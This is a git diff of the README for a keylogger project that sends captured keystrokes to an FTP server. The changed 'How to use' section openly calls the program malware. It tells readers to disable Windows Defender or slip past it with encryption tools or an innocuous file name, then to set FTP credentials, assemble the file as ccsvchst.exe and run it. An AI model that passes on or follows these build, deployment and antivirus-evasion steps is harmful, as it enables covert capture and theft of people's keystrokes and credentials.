@@ -16,7 +16,7 @@ Fully-functional FTP keylogger (2015) that I wrote during my free time. Written 
 
 ## How to use:
 You may first need to [temporarily disable Windows Defender](https://github.com/andrewcanafe/Mini-FTP-Keylogger/blob/master/README.md#how-to-temporarily-disable-windows-defender). However, this can be bypassed by using dynamic encryption tools, renaming the file to a less suspicious name, etc. Running a newer version of the keylogger will automatically overwrite an older version, and vice versa.
-1. Open [miniftpkeylogger.asm]('Mini FTP Keylogger/miniftpkeylogger.asm') and edit the username, password, and server name fields
+1. Open miniftpkeylogger.asm and edit the username, password, and server name fields
 2. Assemble using MASM64 to create ccsvchst.exe
 3. Use ccsvchst.exe (malware) at your own risk
 
